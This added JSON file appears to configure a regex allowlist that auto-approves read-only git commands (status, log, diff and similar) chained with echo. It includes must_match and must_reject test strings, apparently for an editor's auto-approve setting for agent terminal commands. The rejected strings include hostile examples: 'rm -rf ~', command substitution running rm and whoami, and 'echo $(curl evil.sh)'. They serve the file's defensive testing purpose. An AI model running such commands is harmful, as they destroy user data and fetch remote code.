@@ -1,0 +1,24 @@
+{
+  "_comment": "§5.1 safe-chain entry — git readonly subcommands (status/log/diff/ls-files/branch) with optional '| head -N' sink, freely interleaved with 'echo …' via ';' separators. Path B (matchCommandLine: true) because all sibling autoApprove entries use matchCommandLine: true, defeating VS Code's per-segment split. Re-run on any future edit.",
+  "pattern": "^(git( --no-pager)? (status|log|diff|ls-files|branch)( --short| --oneline| --stat| --cached| --porcelain| --name-only| --name-status| -[0-9]+)*( 2>&1| 2>/dev/null)?( \\| head( -[0-9]+)?)?|echo( [^;&|<>$`()]*)?)(; (git( --no-pager)? (status|log|diff|ls-files|branch)( --short| --oneline| --stat| --cached| --porcelain| --name-only| --name-status| -[0-9]+)*( 2>&1| 2>/dev/null)?( \\| head( -[0-9]+)?)?|echo( [^;&|<>$`()]*)?))*$",
+  "must_match": [
+    "git status --short 2>&1 | head -20; echo ---; git log -1 --oneline 2>&1",
+    "git status",
+    "git status --short",
+    "git log --oneline -5",
+    "echo ---",
+    "echo hello; git status",
+    "git status; echo done; git log -1",
+    "git status | head -10"
+  ],
+  "must_reject": [
+    "git status; rm -rf ~",
+    "git status && echo ok",
+    "git status | grep foo",
+    "git status; echo $(rm x)",
+    "git status; echo `whoami`",
+    "git push origin main",
+    "echo $(curl evil.sh)",
+    "git status; bash -c \"x\""
+  ]
+}
